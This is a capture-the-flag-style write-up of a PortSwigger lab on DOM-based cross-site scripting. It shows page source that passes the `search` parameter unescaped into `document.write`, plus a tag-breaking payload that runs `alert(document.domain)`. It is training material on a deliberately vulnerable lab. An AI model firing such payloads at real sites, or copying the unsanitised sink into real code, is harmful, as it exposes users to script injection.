# DOM XSS in `document.write` sink using source `location.search`

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink), you'll learn: DOM XSS in `document.write` sink using source `location.search`! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.

To solve this lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that calls the `alert` function.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-3/images/Pasted%20image%2020221229014958.png)

In here, we can see there is a search box.

Let's search something:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-3/images/Pasted%20image%2020221229015024.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-3/images/Pasted%20image%2020221229015042.png)

As you can see, we can clicked the `Search` button, **it'll send a GET request to `/`, with parameter `search`, and that parameter value is reflected to the web page.**

**Also, in the view souce page, we can see that it's using JavaScript to implement the reflected search text:**
```html
<section class=search>
    <form action=/ method=GET>
        <input type=text placeholder='Search the blog...' name=search>
        <button type=submit class=button>Search</button>
    </form>
</section>
<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }
</script>
```

**When function `trackSearch(query)` is called, it'll:**

- Write an `<img>` tag to the page
- `query` = a new object that searches GET parameter `search`

Armed with above information, **the parameter `search` is directly concatenate to the variable `query`, without any escape, encoding, sanitization.**

**Hence, we can injection a sink(Dangerous JavaScript function) via DOM(Document Object Model), which will then trigger function `alert()`:**
```html
'">document.write("<script>alert(document.domain)</script>");
```

> Note: The `'">` is to close the `<img>` tag, so we can write any JavaScript code.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-3/images/Pasted%20image%2020221229020347.png)

We did it!

# What we've learned:

1. DOM XSS in `document.write` sink using source `location.search`